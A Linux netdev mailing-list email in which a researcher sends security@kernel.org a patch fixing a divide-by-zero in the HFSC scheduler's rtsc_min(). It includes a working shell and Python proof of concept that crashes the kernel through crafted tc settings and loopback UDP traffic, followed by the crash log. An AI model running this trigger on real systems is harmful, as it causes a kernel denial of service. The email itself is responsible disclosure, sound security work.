Return-Path: <netdev+bounces-272207-lists+netdev=lfdr.de@vger.kernel.org>
Delivered-To: lists+netdev@lfdr.de
Received: from mail.lfdr.de
	by lfdr with LMTP
	id mL0QEiCCxWlc+wQAu9opvQ
	(envelope-from <netdev+bounces-272207-lists+netdev=lfdr.de@vger.kernel.org>)
	for <lists+netdev@lfdr.de>; Thu, 26 Mar 2026 19:59:44 +0100
X-Original-To: lists+netdev@lfdr.de
Received: from tor.lore.kernel.org (tor.lore.kernel.org [172.105.105.114])
	by mail.lfdr.de (Postfix) with ESMTPS id B4D9933A9C0
	for <lists+netdev@lfdr.de>; Thu, 26 Mar 2026 19:59:43 +0100 (CET)
Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
	by tor.lore.kernel.org (Postfix) with ESMTP id 88F25304E7C7
	for <lists+netdev@lfdr.de>; Thu, 26 Mar 2026 18:55:52 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 7058D3AEF26;
	Thu, 26 Mar 2026 18:54:57 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b="ofyhaqKm"
X-Original-To: netdev@vger.kernel.org
Received: from mail-dy1-f169.google.com (mail-dy1-f169.google.com [74.125.82.169])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id BA13D3A6EE5
	for <netdev@vger.kernel.org>; Thu, 26 Mar 2026 18:54:55 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.82.169
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1774551297; cv=none; b=r2him2ClrzZdrVxsbelH+jiceH+YXVudlkNEwc6Nz/2lL/2hhRn4d4yzKkRQn2RdV4VGpkxy4NwVtrtJzPnb9zv3OW7S/M9Cayp+BNsbONmaCw6ecOmDUWZXqV9Ru/kj+3M0+q/Lkklam1dbBDZD84tu1TJxeGnv414s1D/7YN0=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1774551297; c=relaxed/simple;
	bh=lxGVZBnf+08GsBICZP8sEEzOYODQn9bhbaVbS0q2K7c=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 Content-Type:Content-Disposition:In-Reply-To; b=SWpO5fkFYqGvkpKqK2axjOlZW5f4QDQCR3xjjEdQe+CygT/hekRHOXtInLfhEEGKWVYlN/ta1r3mIj+aG5DRNOj7gwE2OBcqIWcQ2SGlvLn3QKbuj3HiMLi+8JQAkD1lJGu6fnrxIZ4ljYXYLCpavplE2wqJ0+qOwF8AnpnYuSk=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu; spf=pass smtp.mailfrom=asu.edu; dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b=ofyhaqKm; arc=none smtp.client-ip=74.125.82.169
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=asu.edu
Received: by mail-dy1-f169.google.com with SMTP id 5a478bee46e88-2bdcf5970cdso833571eec.0
        for <netdev@vger.kernel.org>; Thu, 26 Mar 2026 11:54:55 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=asu.edu; s=google; t=1774551295; x=1775156095; darn=vger.kernel.org;
        h=in-reply-to:content-transfer-encoding:content-disposition
         :mime-version:references:message-id:subject:cc:to:from:date:from:to
         :cc:subject:date:message-id:reply-to;
        bh=9Rz+Pt38YSBF4T0Yp1WHN3bpE/gP/jXbcLkY+ak3ozA=;
        b=ofyhaqKmda+n31+of5vxgfvP6fXFIAeMxl3uPpU0YhuCY/oQ3P8yWnRRgrPZkBjoKv
         8D+D8Q1TxqmiK+wHgNFQejv75gfSm2B2BsM4L1fnmCXdoH+ZZToO/BnhgRvU2roBbx3+
         V75xgf1TUdf1UYelXPocHcUtgrj53PYUHpFjmlgQAwXL2QYs4/9DDRx/xWyQE0kVd+et
         xAAjrFzKPSZb64ySXks1dIdqt0FgkvwE9jDbFhWIja6N3/PcNawyoTOyCd80T+a6h5JZ
         eDzB/ktX4i9Xux77mdBcKZ/5PHjNYPy7fccGazbGf9ozCFw7PZD3+aVi8qJao5RpOQIs
         HDcg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1774551295; x=1775156095;
        h=in-reply-to:content-transfer-encoding:content-disposition
         :mime-version:references:message-id:subject:cc:to:from:date:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
        bh=9Rz+Pt38YSBF4T0Yp1WHN3bpE/gP/jXbcLkY+ak3ozA=;
        b=T1hN4T4yTQKIf68tAn4U5BB3weZfbE6wI+auI7ydkOwQhnZm+eDCsV9WjcVJATcw3b
         pbGzazz1WCWFRtykz/OOByq62Z7c+FjKDvM2dLXhHQ7Ds6AoeZ9VBmcQP7s5lZmjoOMU
         zA4bRxEh74Acp2USDT1514vnsOEgl+kHXJq4Fbfc527Qd5+8zoZy9YP3CgJWzmYxm/Yv
         iUEFjE14c0Fx+1XMSJMQJpkugeLvGrtagOLX8J+unEvse/Cb6zN31ZfTjiTm7n0fa3zm
         xmbThYyloJ6jzohZ3EerxwvzkP0sUJlx44Lq1NU+VtPxnydIul5NF5xVDGCBHvLWwh5D
         HHMw==
X-Gm-Message-State: AOJu0Yxf8bfx4x2PAKKeYpxorEjl6C0biw441K0cu09kGeNSq6b1LCql
	8pbliYC3HQGn3kNXipHN2j78vnx7oJk5fh+Yu3TjDP3ppCcu4cd3ZrxMBm6iPpz4/w==
X-Gm-Gg: ATEYQzwQQ6RRotPtxjW+nhjLYmhJlN5YtKKlFCpwx8hcJLhVzfe7WwgYhdhhOtLsf4O
	/nVvwSTjSkI2PpK/0Jw/WTrnkhgbyb67d0UZgQxg7RvoMk0FEWn0Ot12TNCxFssy7TdyudSsQ7M
	51PEgq9ToVepp5pTheKcgi6sI/AuNDY343+4vP0QfX2HR9YZEnncej3Qtve6ekM0APPK2DlZSFY
	HL0UXnokuMSKeCeHnC8llyugeWJ+D/PaIfrpUh28Z5wvUQGmzuk88hYz5c9SyFE1UZcHJTLuxKi
	HHVriwm2RP4tpNW2slu0sj7hDbajAo8ebSJbPo02F/OtcPXzbKMXUO+tyaWfLDYff+FHBgGIDVE
	PdoU0oIheTk8fCI8qR0EwQBrj8ffJwLo2WKKbZZj/6ljMT+kYJ8Xd6GGnd97W2a5NSrH5U888gH
	7yhb/nl7fZMQHLRpErv+ZYNO/DRfEjD3AKvYo6qNqd
X-Received: by 2002:a05:7300:2153:b0:2c1:73d9:2790 with SMTP id 5a478bee46e88-2c1772a36e0mr1432271eec.21.1774551294722;
        Thu, 26 Mar 2026 11:54:54 -0700 (PDT)
Received: from p1 (209-147-138-15.nat.asu.edu. [209.147.138.15])
        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-2c16ed9f739sm3208457eec.16.2026.03.26.11.54.54
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Thu, 26 Mar 2026 11:54:54 -0700 (PDT)
Date: Thu, 26 Mar 2026 11:54:52 -0700
From: Xiang Mei <xmei5@asu.edu>
To: security@kernel.org
Cc: netdev@vger.kernel.org, pabeni@redhat.com, jhs@mojatatu.com, 
	jiri@resnulli.us, davem@davemloft.net, edumazet@google.com, kuba@kernel.org, 
	horms@kernel.org, bestswngs@gmail.com
Subject: Re: [PATCH net v2] net/sched: sch_hfsc: fix divide-by-zero in
 rtsc_min()
Message-ID: <g5kyhh74rriqg4ayz5txfqqtxpuklzu4kbkmcwihqpvyv4xq2s@xcpvtqh7bh5g>
References: <20260326075851.3967598-1-xmei5@asu.edu>
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Disposition: inline
Content-Transfer-Encoding: 8bit
In-Reply-To: <20260326075851.3967598-1-xmei5@asu.edu>
X-Spamd-Result: default: False [-1.66 / 15.00];
	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=1];
	MID_RHS_NOT_FQDN(0.50)[];
	DMARC_POLICY_ALLOW(-0.50)[asu.edu,none];
	R_SPF_ALLOW(-0.20)[+ip4:172.105.105.114:c];
	R_DKIM_ALLOW(-0.20)[asu.edu:s=google];
	MAILLIST(-0.15)[generic];
	MIME_GOOD(-0.10)[text/plain];
	HAS_LIST_UNSUB(-0.01)[];
	FORGED_SENDER_MAILLIST(0.00)[];
	DKIM_TRACE(0.00)[asu.edu:+];
	RCVD_TLS_LAST(0.00)[];
	TAGGED_FROM(0.00)[bounces-272207-lists,netdev=lfdr.de];
	FREEMAIL_CC(0.00)[vger.kernel.org,redhat.com,mojatatu.com,resnulli.us,davemloft.net,google.com,kernel.org,gmail.com];
	FORGED_RECIPIENTS_MAILLIST(0.00)[];
	MISSING_XM_UA(0.00)[];
	FROM_HAS_DN(0.00)[];
	MIME_TRACE(0.00)[0:+];
	RCVD_COUNT_FIVE(0.00)[5];
	PRECEDENCE_BULK(0.00)[];
	FROM_NEQ_ENVFROM(0.00)[xmei5@asu.edu,netdev@vger.kernel.org];
	ASN(0.00)[asn:63949, ipnet:172.105.96.0/20, country:SG];
	TO_DN_NONE(0.00)[];
	RCPT_COUNT_SEVEN(0.00)[10];
	NEURAL_HAM(-0.00)[-1.000];
	RCVD_VIA_SMTP_AUTH(0.00)[];
	TAGGED_RCPT(0.00)[netdev];
	DBL_BLOCKED_OPENRESOLVER(0.00)[tor.lore.kernel.org:helo,tor.lore.kernel.org:rdns,asu.edu:dkim,asu.edu:email]
X-Rspamd-Queue-Id: B4D9933A9C0
X-Rspamd-Action: no action
X-Rspamd-Server: lfdr

On Thu, Mar 26, 2026 at 12:58:51AM -0700, Xiang Mei wrote:
> m2sm() converts a u32 slope to a u64 scaled value.  For large inputs
> (e.g. m1=4000000000), the result can reach 2^32.  rtsc_min() stores
> the difference of two such u64 values in a u32 variable `dsm` and
> uses it as a divisor.  When the difference is exactly 2^32 the
> truncation yields zero, causing a divide-by-zero oops in the
> concave-curve intersection path:
> 
>   Oops: divide error: 0000
>   RIP: 0010:rtsc_min (net/sched/sch_hfsc.c:601)
>   Call Trace:
>    init_ed (net/sched/sch_hfsc.c:629)
>    hfsc_enqueue (net/sched/sch_hfsc.c:1569)
>    [...]
> 
> Widen `dsm` to u64 and replace do_div() with div64_u64() so the full
> difference is preserved.
> 
> Fixes: 1da177e4c3f4 ("Linux-2.6.12-rc2")
> Reported-by: Weiming Shi <bestswngs@gmail.com>
> Signed-off-by: Xiang Mei <xmei5@asu.edu>
> ---
> v2: resend to netdev ML
> 
>  net/sched/sch_hfsc.c | 4 ++--
>  1 file changed, 2 insertions(+), 2 deletions(-)
> 
> diff --git a/net/sched/sch_hfsc.c b/net/sched/sch_hfsc.c
> index b5657ffbbf84..83b2ca2e37fc 100644
> --- a/net/sched/sch_hfsc.c
> +++ b/net/sched/sch_hfsc.c
> @@ -555,7 +555,7 @@ static void
>  rtsc_min(struct runtime_sc *rtsc, struct internal_sc *isc, u64 x, u64 y)
>  {
>  	u64 y1, y2, dx, dy;
> -	u32 dsm;
> +	u64 dsm;
>  
>  	if (isc->sm1 <= isc->sm2) {
>  		/* service curve is convex */
> @@ -598,7 +598,7 @@ rtsc_min(struct runtime_sc *rtsc, struct internal_sc *isc, u64 x, u64 y)
>  	 */
>  	dx = (y1 - y) << SM_SHIFT;
>  	dsm = isc->sm1 - isc->sm2;
> -	do_div(dx, dsm);
> +	dx = div64_u64(dx, dsm);
>  	/*
>  	 * check if (x, y1) belongs to the 1st segment of rtsc.
>  	 * if so, add the offset.
> -- 
> 2.43.0
>

Thanks for your attention for this bug.
The following information could help you to reproduce the bug:

PoC:
```sh
#!/bin/sh
ip link set lo up

tc qdisc replace dev lo root handle 1: \
    stab overhead 3000000 mtu 0 tsize 0 \
    hfsc default 1
tc class replace dev lo parent 1: classid 1:1 hfsc \
    rt m1 32gbit d 1ms m2 0bit \
    ls m1 32gbit d 1ms m2 0bit

# Send UDP to loopback (same method as C PoC)
python3 -c "
import socket,time
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
s.sendto(b'A'*64,('127.0.0.1',1337))  # activate class
time.sleep(1)                           # drain → idle
s.sendto(b'A'*64,('127.0.0.1',1337))  # reactivation → div-by-zero
"
```

Intended Crash:
```log
[   25.713426] Oops: divide error: 0000 [#1] SMP KASAN NOPTI
[   25.713720] CPU: 1 UID: 0 PID: 335 Comm: python3 Not tainted 7.0.0-rc4+ #4 PREEMPTLAZY
[   25.714102] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.17.0-0-gb52ca86e094
[   25.714825] RIP: 0010:rtsc_min+0x148/0x360
[   25.715034] Code: 0f 85 ad 01 00 00 48 8b 53 18 4c 01 f2 48 39 d0 0f 83 ea 00 00 00 8b 0c 24 4c c
[   25.715928] RSP: 0018:ffff888013eef438 EFLAGS: 00010206
[   25.716198] RAX: 00000f41d6000000 RBX: ffff888010e2c150 RCX: 0000000000000000
[   25.716555] RDX: 0000000000000000 RSI: 0000000000000000 RDI: ffff888010e2c168
[   25.716896] RBP: ffff888010e2c1e0 R08: 0000000000000001 R09: ffff888010e2c008
[   25.717238] R10: ffff888013488000 R11: ffff888013eefb30 R12: 00000000003d0900
[   25.717724] R13: 0000000100000000 R14: 00000000002dc72a R15: 0000000017f10a4c
[   25.718065] FS:  000078cd1f4cf040(0000) GS:ffff8881781cb000(0000) knlGS:0000000000000000
[   25.718456] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   25.718766] CR2: 000078cd1f5f87d0 CR3: 0000000013fb8002 CR4: 0000000000772ef0
[   25.719118] PKRU: 55555554
[   25.719262] Call Trace:
[   25.719390]  <TASK>
[   25.719503]  ? ktime_get+0x65/0x150
[   25.719704]  init_ed+0x70/0x4d0
[   25.719870]  hfsc_enqueue+0x7bb/0xef0
[   25.720059]  ? kmalloc_reserve+0x10c/0x2c0
```

This bug is a DoS bug requiring ns_capable(CAP_NET_ADMIN).
Please let me know if you have any questions for the patch and poc.

Thanks,
Xiang

